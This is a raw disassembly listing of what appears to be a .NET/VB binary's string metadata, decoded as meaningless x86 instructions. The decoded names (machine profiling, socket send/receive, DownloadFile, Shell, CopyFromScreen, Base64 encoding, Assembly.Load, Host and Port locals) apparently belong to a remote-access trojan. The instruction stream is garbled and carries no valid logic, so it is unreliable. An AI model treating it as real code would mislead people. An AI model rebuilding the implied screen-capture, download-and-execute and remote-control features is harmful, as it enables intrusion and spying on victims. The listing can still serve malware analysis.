  409b9a:	61                   	popa
  409b9b:	6c                   	insb   (%dx),%es:(%edi)
  409b9c:	00 57 69             	add    %dl,0x69(%edi)
  409b9f:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba0:	64 6f                	outsl  %fs:(%esi),(%dx)
  409ba2:	77 73                	ja     0x409c17
  409ba4:	42                   	inc    %edx
  409ba5:	75 69                	jne    0x409c10
  409ba7:	6c                   	insb   (%dx),%es:(%edi)
  409ba8:	74 49                	je     0x409bf3
  409baa:	6e                   	outsb  %ds:(%esi),(%dx)
  409bab:	52                   	push   %edx
  409bac:	6f                   	outsl  %ds:(%esi),(%dx)
  409bad:	6c                   	insb   (%dx),%es:(%edi)
  409bae:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  409bb2:	49                   	dec    %ecx
  409bb3:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb4:	52                   	push   %edx
  409bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb6:	6c                   	insb   (%dx),%es:(%edi)
  409bb7:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  409bbb:	6e                   	outsb  %ds:(%esi),(%dx)
  409bbc:	61                   	popa
  409bbd:	67 65 6d             	gs insl (%dx),%es:(%di)
  409bc0:	65 6e                	outsb  %gs:(%esi),(%dx)
  409bc2:	74 42                	je     0x409c06
  409bc4:	61                   	popa
  409bc5:	73 65                	jae    0x409c2c
  409bc7:	4f                   	dec    %edi
  409bc8:	62 6a 65             	bound  %ebp,0x65(%edx)
  409bcb:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409bcf:	61                   	popa
  409bd0:	6e                   	outsb  %ds:(%esi),(%dx)
  409bd1:	61                   	popa
  409bd2:	67 65 6d             	gs insl (%dx),%es:(%di)
  409bd5:	65 6e                	outsb  %gs:(%esi),(%dx)
  409bd7:	74 4f                	je     0x409c28
  409bd9:	62 6a 65             	bound  %ebp,0x65(%edx)
  409bdc:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409be0:	6c                   	insb   (%dx),%es:(%edi)
  409be1:	6c                   	insb   (%dx),%es:(%edi)
  409be2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409be7:	6e                   	outsb  %ds:(%esi),(%dx)
  409be8:	00 4d 61             	add    %cl,0x61(%ebp)
  409beb:	6e                   	outsb  %ds:(%esi),(%dx)
  409bec:	61                   	popa
  409bed:	67 65 6d             	gs insl (%dx),%es:(%di)
  409bf0:	65 6e                	outsb  %gs:(%esi),(%dx)
  409bf2:	74 4f                	je     0x409c43
  409bf4:	62 6a 65             	bound  %ebp,0x65(%edx)
  409bf7:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  409bfb:	75 6d                	jne    0x409c6a
  409bfd:	65 72 61             	gs jb  0x409c61
  409c00:	74 6f                	je     0x409c71
  409c02:	72 00                	jb     0x409c04
  409c04:	67 65 74 5f          	addr16 gs je 0x409c67
  409c08:	4d                   	dec    %ebp
  409c09:	61                   	popa
  409c0a:	63 68 69             	arpl   %ebp,0x69(%eax)
  409c0d:	6e                   	outsb  %ds:(%esi),(%dx)
  409c0e:	65 4e                	gs dec %esi
  409c10:	61                   	popa
  409c11:	6d                   	insl   (%dx),%es:(%edi)
  409c12:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409c16:	74 00                	je     0x409c18
  409c18:	67 65 74 5f          	addr16 gs je 0x409c7b
  409c1c:	49                   	dec    %ecx
  409c1d:	74 65                	je     0x409c84
  409c1f:	6d                   	insl   (%dx),%es:(%edi)
  409c20:	00 41 70             	add    %al,0x70(%ecx)
  409c23:	70 65                	jo     0x409c8a
  409c25:	6e                   	outsb  %ds:(%esi),(%dx)
  409c26:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  409c2a:	74 5f                	je     0x409c8b
  409c2c:	4c                   	dec    %esp
  409c2d:	65 6e                	outsb  %gs:(%esi),(%dx)
  409c2f:	67 74 68             	addr16 je 0x409c9a
  409c32:	00 53 75             	add    %dl,0x75(%ebx)
  409c35:	62 73 74             	bound  %esi,0x74(%ebx)
  409c38:	72 69                	jb     0x409ca3
  409c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c3b:	67 00 4f 62          	add    %cl,0x62(%bx)
  409c3f:	6a 65                	push   $0x65
  409c41:	63 74 51 75          	arpl   %esi,0x75(%ecx,%edx,2)
  409c45:	65 72 79             	gs jb  0x409cc1
  409c48:	00 4d 61             	add    %cl,0x61(%ebp)
  409c4b:	6e                   	outsb  %ds:(%esi),(%dx)
  409c4c:	61                   	popa
  409c4d:	67 65 6d             	gs insl (%dx),%es:(%di)
  409c50:	65 6e                	outsb  %gs:(%esi),(%dx)
  409c52:	74 4f                	je     0x409ca3
  409c54:	62 6a 65             	bound  %ebp,0x65(%edx)
  409c57:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  409c5b:	6d                   	insl   (%dx),%es:(%edi)
  409c5c:	70 74                	jo     0x409cd2
  409c5e:	79 00                	jns    0x409c60
  409c60:	43                   	inc    %ebx
  409c61:	6f                   	outsl  %ds:(%esi),(%dx)
  409c62:	6e                   	outsb  %ds:(%esi),(%dx)
  409c63:	63 61 74             	arpl   %esp,0x74(%ecx)
  409c66:	65 6e                	outsb  %gs:(%esi),(%dx)
  409c68:	61                   	popa
  409c69:	74 65                	je     0x409cd0
  409c6b:	4f                   	dec    %edi
  409c6c:	62 6a 65             	bound  %ebp,0x65(%edx)
  409c6f:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  409c73:	65 74 5f             	gs je  0x409cd5
  409c76:	49                   	dec    %ecx
  409c77:	6e                   	outsb  %ds:(%esi),(%dx)
  409c78:	66 6f                	outsw  %ds:(%esi),(%dx)
  409c7a:	00 67 65             	add    %ah,0x65(%edi)
  409c7d:	74 5f                	je     0x409cde
  409c7f:	54                   	push   %esp
  409c80:	6f                   	outsl  %ds:(%esi),(%dx)
  409c81:	74 61                	je     0x409ce4
  409c83:	6c                   	insb   (%dx),%es:(%edi)
  409c84:	50                   	push   %eax
  409c85:	68 79 73 69 63       	push   $0x63697379
  409c8a:	61                   	popa
  409c8b:	6c                   	insb   (%dx),%es:(%edi)
  409c8c:	4d                   	dec    %ebp
  409c8d:	65 6d                	gs insl (%dx),%es:(%edi)
  409c8f:	6f                   	outsl  %ds:(%esi),(%dx)
  409c90:	72 79                	jb     0x409d0b
  409c92:	00 55 49             	add    %dl,0x49(%ebp)
  409c95:	6e                   	outsb  %ds:(%esi),(%dx)
  409c96:	74 36                	je     0x409cce
  409c98:	34 00                	xor    $0x0,%al
  409c9a:	43                   	inc    %ebx
  409c9b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  409c9d:	76 65                	jbe    0x409d04
  409c9f:	72 73                	jb     0x409d14
  409ca1:	69 6f 6e 00 56 61 6c 	imul   $0x6c615600,0x6e(%edi),%ebp
  409ca8:	00 4d 61             	add    %cl,0x61(%ebp)
  409cab:	74 68                	je     0x409d15
  409cad:	00 52 6f             	add    %dl,0x6f(%edx)
  409cb0:	75 6e                	jne    0x409d20
  409cb2:	64 00 44 6f 75       	add    %al,%fs:0x75(%edi,%ebp,2)
  409cb7:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  409cbb:	52                   	push   %edx
  409cbc:	65 6d                	gs insl (%dx),%es:(%edi)
  409cbe:	6f                   	outsl  %ds:(%esi),(%dx)
  409cbf:	76 65                	jbe    0x409d26
  409cc1:	00 45 6e             	add    %al,0x6e(%ebp)
  409cc4:	64 52                	fs push %edx
  409cc6:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409cca:	76 65                	jbe    0x409d31
  409ccc:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  409cd0:	72 72                	jb     0x409d44
  409cd2:	61                   	popa
  409cd3:	79 00                	jns    0x409cd5
  409cd5:	54                   	push   %esp
  409cd6:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd7:	4c                   	dec    %esp
  409cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd9:	6e                   	outsb  %ds:(%esi),(%dx)
  409cda:	67 00 53 74          	add    %dl,0x74(%bp,%di)
  409cde:	72 65                	jb     0x409d45
  409ce0:	61                   	popa
  409ce1:	6d                   	insl   (%dx),%es:(%edi)
  409ce2:	00 57 72             	add    %dl,0x72(%edi)
  409ce5:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  409cec:	00 
  409ced:	57                   	push   %edi
  409cee:	72 69                	jb     0x409d59
  409cf0:	74 65                	je     0x409d57
  409cf2:	00 50 61             	add    %dl,0x61(%eax)
  409cf5:	72 61                	jb     0x409d58
  409cf7:	6d                   	insl   (%dx),%es:(%edi)
  409cf8:	65 74 65             	gs je  0x409d60
  409cfb:	72 69                	jb     0x409d66
  409cfd:	7a 65                	jp     0x409d64
  409cff:	64 54                	fs push %esp
  409d01:	68 72 65 61 64       	push   $0x64616572
  409d06:	53                   	push   %ebx
  409d07:	74 61                	je     0x409d6a
  409d09:	72 74                	jb     0x409d7f
  409d0b:	00 4f 62             	add    %cl,0x62(%edi)
  409d0e:	6a 65                	push   $0x65
  409d10:	63 74 46 6c          	arpl   %esi,0x6c(%esi,%eax,2)
  409d14:	6f                   	outsl  %ds:(%esi),(%dx)
  409d15:	77 43                	ja     0x409d5a
  409d17:	6f                   	outsl  %ds:(%esi),(%dx)
  409d18:	6e                   	outsb  %ds:(%esi),(%dx)
  409d19:	74 72                	je     0x409d8d
  409d1b:	6f                   	outsl  %ds:(%esi),(%dx)
  409d1c:	6c                   	insb   (%dx),%es:(%edi)
  409d1d:	00 43 68             	add    %al,0x68(%ebx)
  409d20:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  409d24:	6f                   	outsl  %ds:(%esi),(%dx)
  409d25:	72 53                	jb     0x409d7a
  409d27:	79 6e                	jns    0x409d97
  409d29:	63 4c 6f 63          	arpl   %ecx,0x63(%edi,%ebp,2)
  409d2d:	6b 4f 6e 56          	imul   $0x56,0x6e(%edi),%ecx
  409d31:	61                   	popa
  409d32:	6c                   	insb   (%dx),%es:(%edi)
  409d33:	75 65                	jne    0x409d9a
  409d35:	54                   	push   %esp
  409d36:	79 70                	jns    0x409da8
  409d38:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
  409d3c:	6e                   	outsb  %ds:(%esi),(%dx)
  409d3d:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  409d44:	74 
  409d45:	65 72 00             	gs jb  0x409d48
  409d48:	53                   	push   %ebx
  409d49:	65 6c                	gs insb (%dx),%es:(%edi)
  409d4b:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  409d50:	64 65 00 50 6f       	fs add %dl,%gs:0x6f(%eax)
  409d55:	6c                   	insb   (%dx),%es:(%edi)
  409d56:	6c                   	insb   (%dx),%es:(%edi)
  409d57:	00 42 65             	add    %al,0x65(%edx)
  409d5a:	67 69 6e 53 65 6e 64 	imul   $0x646e65,0x53(%bp),%ebp
  409d61:	00 
  409d62:	43                   	inc    %ebx
  409d63:	6c                   	insb   (%dx),%es:(%edi)
  409d64:	6f                   	outsl  %ds:(%esi),(%dx)
  409d65:	73 65                	jae    0x409dcc
  409d67:	00 47 43             	add    %al,0x43(%edi)
  409d6a:	00 43 6f             	add    %al,0x6f(%ebx)
  409d6d:	6c                   	insb   (%dx),%es:(%edi)
  409d6e:	6c                   	insb   (%dx),%es:(%edi)
  409d6f:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  409d74:	43                   	inc    %ebx
  409d75:	6c                   	insb   (%dx),%es:(%edi)
  409d76:	6f                   	outsl  %ds:(%esi),(%dx)
  409d77:	73 75                	jae    0x409dee
  409d79:	72 65                	jb     0x409de0
  409d7b:	24 5f                	and    $0x5f,%al
  409d7d:	5f                   	pop    %edi
  409d7e:	31 00                	xor    %eax,(%eax)
  409d80:	24 56                	and    $0x56,%al
  409d82:	42                   	inc    %edx
  409d83:	24 4c                	and    $0x4c,%al
  409d85:	6f                   	outsl  %ds:(%esi),(%dx)
  409d86:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409d89:	5f                   	pop    %edi
  409d8a:	48                   	dec    %eax
  409d8b:	6f                   	outsl  %ds:(%esi),(%dx)
  409d8c:	73 74                	jae    0x409e02
  409d8e:	00 24 56             	add    %ah,(%esi,%edx,2)
  409d91:	42                   	inc    %edx
  409d92:	24 4c                	and    $0x4c,%al
  409d94:	6f                   	outsl  %ds:(%esi),(%dx)
  409d95:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409d98:	5f                   	pop    %edi
  409d99:	50                   	push   %eax
  409d9a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d9b:	72 74                	jb     0x409e11
  409d9d:	00 5f 4c             	add    %bl,0x4c(%edi)
  409da0:	61                   	popa
  409da1:	6d                   	insl   (%dx),%es:(%edi)
  409da2:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409da6:	5f                   	pop    %edi
  409da7:	5f                   	pop    %edi
  409da8:	38 00                	cmp    %al,(%eax)
  409daa:	5f                   	pop    %edi
  409dab:	4c                   	dec    %esp
  409dac:	61                   	popa
  409dad:	6d                   	insl   (%dx),%es:(%edi)
  409dae:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409db2:	5f                   	pop    %edi
  409db3:	5f                   	pop    %edi
  409db4:	36 00 5f 4c          	add    %bl,%ss:0x4c(%edi)
  409db8:	61                   	popa
  409db9:	6d                   	insl   (%dx),%es:(%edi)
  409dba:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409dbe:	5f                   	pop    %edi
  409dbf:	5f                   	pop    %edi
  409dc0:	37                   	aaa
  409dc1:	00 53 79             	add    %dl,0x79(%ebx)
  409dc4:	73 74                	jae    0x409e3a
  409dc6:	65 6d                	gs insl (%dx),%es:(%edi)
  409dc8:	2e 44                	cs inc %esp
  409dca:	72 61                	jb     0x409e2d
  409dcc:	77 69                	ja     0x409e37
  409dce:	6e                   	outsb  %ds:(%esi),(%dx)
  409dcf:	67 00 47 72          	add    %al,0x72(%bx)
  409dd3:	61                   	popa
  409dd4:	70 68                	jo     0x409e3e
  409dd6:	69 63 73 00 53 69 7a 	imul   $0x7a695300,0x73(%ebx),%esp
  409ddd:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  409de1:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  409de5:	67 6c                	insb   (%dx),%es:(%di)
  409de7:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  409deb:	74 6d                	je     0x409e5a
  409ded:	61                   	popa
  409dee:	70 00                	jo     0x409df0
  409df0:	53                   	push   %ebx
  409df1:	74 72                	je     0x409e65
  409df3:	69 6e 67 73 00 43 6f 	imul   $0x6f430073,0x67(%esi),%ebp
  409dfa:	6d                   	insl   (%dx),%es:(%edi)
  409dfb:	70 61                	jo     0x409e5e
  409dfd:	72 65                	jb     0x409e64
  409dff:	4d                   	dec    %ebp
  409e00:	65 74 68             	gs je  0x409e6b
  409e03:	6f                   	outsl  %ds:(%esi),(%dx)
  409e04:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  409e08:	73 74                	jae    0x409e7e
  409e0a:	65 6d                	gs insl (%dx),%es:(%edi)
  409e0c:	2e 57                	cs push %edi
  409e0e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409e15:	46                   	inc    %esi
  409e16:	6f                   	outsl  %ds:(%esi),(%dx)
  409e17:	72 6d                	jb     0x409e86
  409e19:	73 00                	jae    0x409e1b
  409e1b:	52                   	push   %edx
  409e1c:	65 73 74             	gs jae 0x409e93
  409e1f:	61                   	popa
  409e20:	72 74                	jb     0x409e96
  409e22:	00 53 6f             	add    %dl,0x6f(%ebx)
  409e25:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409e28:	74 53                	je     0x409e7d
  409e2a:	68 75 74 64 6f       	push   $0x6f647475
  409e2f:	77 6e                	ja     0x409e9f
  409e31:	00 53 68             	add    %dl,0x68(%ebx)
  409e34:	75 74                	jne    0x409eaa
  409e36:	64 6f                	outsl  %fs:(%esi),(%dx)
  409e38:	77 6e                	ja     0x409ea8
  409e3a:	00 43 6f             	add    %al,0x6f(%ebx)
  409e3d:	6e                   	outsb  %ds:(%esi),(%dx)
  409e3e:	76 65                	jbe    0x409ea5
  409e40:	72 74                	jb     0x409eb6
  409e42:	00 46 72             	add    %al,0x72(%esi)
  409e45:	6f                   	outsl  %ds:(%esi),(%dx)
  409e46:	6d                   	insl   (%dx),%es:(%edi)
  409e47:	42                   	inc    %edx
  409e48:	61                   	popa
  409e49:	73 65                	jae    0x409eb0
  409e4b:	36 34 53             	ss xor $0x53,%al
  409e4e:	74 72                	je     0x409ec2
  409e50:	69 6e 67 00 53 65 72 	imul   $0x72655300,0x67(%esi),%ebp
  409e57:	76 69                	jbe    0x409ec2
  409e59:	63 65 50             	arpl   %esp,0x50(%ebp)
  409e5c:	6f                   	outsl  %ds:(%esi),(%dx)
  409e5d:	69 6e 74 4d 61 6e 61 	imul   $0x616e614d,0x74(%esi),%ebp
  409e64:	67 65 72 00          	addr16 gs jb 0x409e68
  409e68:	73 65                	jae    0x409ecf
  409e6a:	74 5f                	je     0x409ecb
  409e6c:	45                   	inc    %ebp
  409e6d:	78 70                	js     0x409edf
  409e6f:	65 63 74 31 30       	arpl   %esi,%gs:0x30(%ecx,%esi,1)
  409e74:	30 43 6f             	xor    %al,0x6f(%ebx)
  409e77:	6e                   	outsb  %ds:(%esi),(%dx)
  409e78:	74 69                	je     0x409ee3
  409e7a:	6e                   	outsb  %ds:(%esi),(%dx)
  409e7b:	75 65                	jne    0x409ee2
  409e7d:	00 53 65             	add    %dl,0x65(%ebx)
  409e80:	63 75 72             	arpl   %esi,0x72(%ebp)
  409e83:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  409e8a:	6f 
  409e8b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409e8e:	54                   	push   %esp
  409e8f:	79 70                	jns    0x409f01
  409e91:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409e95:	74 5f                	je     0x409ef6
  409e97:	53                   	push   %ebx
  409e98:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e9c:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  409ea3:	6f 
  409ea4:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409ea7:	00 73 65             	add    %dh,0x65(%ebx)
  409eaa:	74 5f                	je     0x409f0b
  409eac:	44                   	inc    %esp
  409ead:	65 66 61             	gs popaw
  409eb0:	75 6c                	jne    0x409f1e
  409eb2:	74 43                	je     0x409ef7
  409eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  409eb5:	6e                   	outsb  %ds:(%esi),(%dx)
  409eb6:	6e                   	outsb  %ds:(%esi),(%dx)
  409eb7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409ebc:	6e                   	outsb  %ds:(%esi),(%dx)
  409ebd:	4c                   	dec    %esp
  409ebe:	69 6d 69 74 00 47 65 	imul   $0x65470074,0x69(%ebp),%ebp
  409ec5:	74 54                	je     0x409f1b
  409ec7:	65 6d                	gs insl (%dx),%es:(%edi)
  409ec9:	70 50                	jo     0x409f1b
  409ecb:	61                   	popa
  409ecc:	74 68                	je     0x409f36
  409ece:	00 43 6f             	add    %al,0x6f(%ebx)
  409ed1:	6d                   	insl   (%dx),%es:(%edi)
  409ed2:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  409ed5:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  409eda:	6e                   	outsb  %ds:(%esi),(%dx)
  409edb:	6c                   	insb   (%dx),%es:(%edi)
  409edc:	6f                   	outsl  %ds:(%esi),(%dx)
  409edd:	61                   	popa
  409ede:	64 46                	fs inc %esi
  409ee0:	69 6c 65 00 41 70 70 	imul   $0x57707041,0x0(%ebp,%eiz,2),%ebp
  409ee7:	57 
  409ee8:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  409eef:	00 53 68             	add    %dl,0x68(%ebx)
  409ef2:	65 6c                	gs insb (%dx),%es:(%edi)
  409ef4:	6c                   	insb   (%dx),%es:(%edi)
  409ef5:	00 41 62             	add    %al,0x62(%ecx)
  409ef8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ef9:	72 74                	jb     0x409f6f
  409efb:	00 52 65             	add    %dl,0x65(%edx)
  409efe:	61                   	popa
  409eff:	64 41                	fs inc %ecx
  409f01:	6c                   	insb   (%dx),%es:(%edi)
  409f02:	6c                   	insb   (%dx),%es:(%edi)
  409f03:	54                   	push   %esp
  409f04:	65 78 74             	gs js  0x409f7b
  409f07:	00 57 72             	add    %dl,0x72(%edi)
  409f0a:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  409f11:	65 
  409f12:	78 74                	js     0x409f88
  409f14:	00 67 65             	add    %ah,0x65(%edi)
  409f17:	74 5f                	je     0x409f78
  409f19:	4d                   	dec    %ebp
  409f1a:	65 73 73             	gs jae 0x409f90
  409f1d:	61                   	popa
  409f1e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  409f23:	6c                   	insb   (%dx),%es:(%edi)
  409f24:	65 74 65             	gs je  0x409f8c
  409f27:	53                   	push   %ebx
  409f28:	75 62                	jne    0x409f8c
  409f2a:	4b                   	dec    %ebx
  409f2b:	65 79 00             	gs jns 0x409f2e
  409f2e:	53                   	push   %ebx
  409f2f:	63 72 65             	arpl   %esi,0x65(%edx)
  409f32:	65 6e                	outsb  %gs:(%esi),(%dx)
  409f34:	00 67 65             	add    %ah,0x65(%edi)
  409f37:	74 5f                	je     0x409f98
  409f39:	50                   	push   %eax
  409f3a:	72 69                	jb     0x409fa5
  409f3c:	6d                   	insl   (%dx),%es:(%edi)
  409f3d:	61                   	popa
  409f3e:	72 79                	jb     0x409fb9
  409f40:	53                   	push   %ebx
  409f41:	63 72 65             	arpl   %esi,0x65(%edx)
  409f44:	65 6e                	outsb  %gs:(%esi),(%dx)
  409f46:	00 67 65             	add    %ah,0x65(%edi)
  409f49:	74 5f                	je     0x409faa
  409f4b:	42                   	inc    %edx
  409f4c:	6f                   	outsl  %ds:(%esi),(%dx)
  409f4d:	75 6e                	jne    0x409fbd
  409f4f:	64 73 00             	fs jae 0x409f52
  409f52:	67 65 74 5f          	addr16 gs je 0x409fb5
  409f56:	57                   	push   %edi
  409f57:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  409f5e:	74 
  409f5f:	5f                   	pop    %edi
  409f60:	48                   	dec    %eax
  409f61:	65 69 67 68 74 00 53 	imul   $0x79530074,%gs:0x68(%edi),%esp
  409f68:	79 
  409f69:	73 74                	jae    0x409fdf
  409f6b:	65 6d                	gs insl (%dx),%es:(%edi)
  409f6d:	2e 44                	cs inc %esp
  409f6f:	72 61                	jb     0x409fd2
  409f71:	77 69                	ja     0x409fdc
  409f73:	6e                   	outsb  %ds:(%esi),(%dx)
  409f74:	67 2e 49             	addr16 cs dec %ecx
  409f77:	6d                   	insl   (%dx),%es:(%edi)
  409f78:	61                   	popa
  409f79:	67 69 6e 67 00 50 69 	imul   $0x78695000,0x67(%bp),%ebp
  409f80:	78 
  409f81:	65 6c                	gs insb (%dx),%es:(%edi)
  409f83:	46                   	inc    %esi
  409f84:	6f                   	outsl  %ds:(%esi),(%dx)
  409f85:	72 6d                	jb     0x409ff4
  409f87:	61                   	popa
  409f88:	74 00                	je     0x409f8a
  409f8a:	49                   	dec    %ecx
  409f8b:	6d                   	insl   (%dx),%es:(%edi)
  409f8c:	61                   	popa
  409f8d:	67 65 00 46 72       	add    %al,%gs:0x72(%bp)
  409f92:	6f                   	outsl  %ds:(%esi),(%dx)
  409f93:	6d                   	insl   (%dx),%es:(%edi)
  409f94:	49                   	dec    %ecx
  409f95:	6d                   	insl   (%dx),%es:(%edi)
  409f96:	61                   	popa
  409f97:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  409f9c:	70 79                	jo     0x40a017
  409f9e:	50                   	push   %eax
  409f9f:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  409fa6:	72 61                	jb     0x40a009
  409fa8:	74 69                	je     0x40a013
  409faa:	6f                   	outsl  %ds:(%esi),(%dx)
  409fab:	6e                   	outsb  %ds:(%esi),(%dx)
  409fac:	00 43 6f             	add    %al,0x6f(%ebx)
  409faf:	70 79                	jo     0x40a02a
  409fb1:	46                   	inc    %esi
  409fb2:	72 6f                	jb     0x40a023
  409fb4:	6d                   	insl   (%dx),%es:(%edi)
  409fb5:	53                   	push   %ebx
  409fb6:	63 72 65             	arpl   %esi,0x65(%edx)
  409fb9:	65 6e                	outsb  %gs:(%esi),(%dx)
  409fbb:	00 47 72             	add    %al,0x72(%edi)
  409fbe:	61                   	popa
  409fbf:	70 68                	jo     0x40a029
  409fc1:	69 63 73 55 6e 69 74 	imul   $0x74696e55,0x73(%ebx),%esp
  409fc8:	00 44 72 61          	add    %al,0x61(%edx,%esi,2)
  409fcc:	77 49                	ja     0x40a017
  409fce:	6d                   	insl   (%dx),%es:(%edi)
  409fcf:	61                   	popa
  409fd0:	67 65 00 49 6d       	add    %cl,%gs:0x6d(%bx,%di)
  409fd5:	61                   	popa
  409fd6:	67 65 46             	addr16 gs inc %esi
  409fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  409fda:	72 6d                	jb     0x40a049
  409fdc:	61                   	popa
  409fdd:	74 00                	je     0x409fdf
  409fdf:	67 65 74 5f          	addr16 gs je 0x40a042
  409fe3:	4a                   	dec    %edx
  409fe4:	70 65                	jo     0x40a04b
  409fe6:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  409fea:	76 65                	jbe    0x40a051
  409fec:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409ff0:	61                   	popa
  409ff1:	73 65                	jae    0x40a058
  409ff3:	36 34 53             	ss xor $0x53,%al
  409ff6:	74 72                	je     0x40a06a
  409ff8:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  409fff:	74 65                	je     0x40a066
  40a001:	6d                   	insl   (%dx),%es:(%edi)
  40a002:	2e 52                	cs push %edx
  40a004:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40a007:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a00c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a00d:	00 4d 65             	add    %cl,0x65(%ebp)
  40a010:	74 68                	je     0x40a07a
  40a012:	6f                   	outsl  %ds:(%esi),(%dx)
  40a013:	64 49                	fs dec %ecx
  40a015:	6e                   	outsb  %ds:(%esi),(%dx)
  40a016:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a018:	00 41 70             	add    %al,0x70(%ecx)
  40a01b:	70 44                	jo     0x40a061
  40a01d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a01e:	6d                   	insl   (%dx),%es:(%edi)
  40a01f:	61                   	popa
  40a020:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40a027:	43                   	inc    %ebx
  40a028:	75 72                	jne    0x40a09c
  40a02a:	72 65                	jb     0x40a091
  40a02c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a02d:	74 44                	je     0x40a073
  40a02f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a030:	6d                   	insl   (%dx),%es:(%edi)
  40a031:	61                   	popa
  40a032:	69 6e 00 41 73 73 65 	imul   $0x65737341,0x0(%esi),%ebp
  40a039:	6d                   	insl   (%dx),%es:(%edi)
  40a03a:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40a03e:	4c                   	dec    %esp
  40a03f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a040:	61                   	popa
  40a041:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  40a045:	74 54                	je     0x40a09b
  40a047:	79 70                	jns    0x40a0b9
  40a049:	65 73 00             	gs jae 0x40a04c
  40a04c:	4d                   	dec    %ebp
  40a04d:	65 6d                	gs insl (%dx),%es:(%edi)
  40a04f:	62 65 72             	bound  %esp,0x72(%ebp)
  40a052:	49                   	dec    %ecx
  40a053:	6e                   	outsb  %ds:(%esi),(%dx)
  40a054:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a056:	00 67 65             	add    %ah,0x65(%edi)
  40a059:	74 5f                	je     0x40a0ba
  40a05b:	4e                   	dec    %esi
  40a05c:	61                   	popa
  40a05d:	6d                   	insl   (%dx),%es:(%edi)
  40a05e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40a062:	74 4d                	je     0x40a0b1
  40a064:	65 74 68             	gs je  0x40a0cf
  40a067:	6f                   	outsl  %ds:(%esi),(%dx)
  40a068:	64 73 00             	fs jae 0x40a06b
  40a06b:	43                   	inc    %ebx
  40a06c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a06d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a06e:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  40a075:	6c 43 
  40a077:	6f                   	outsl  %ds:(%esi),(%dx)
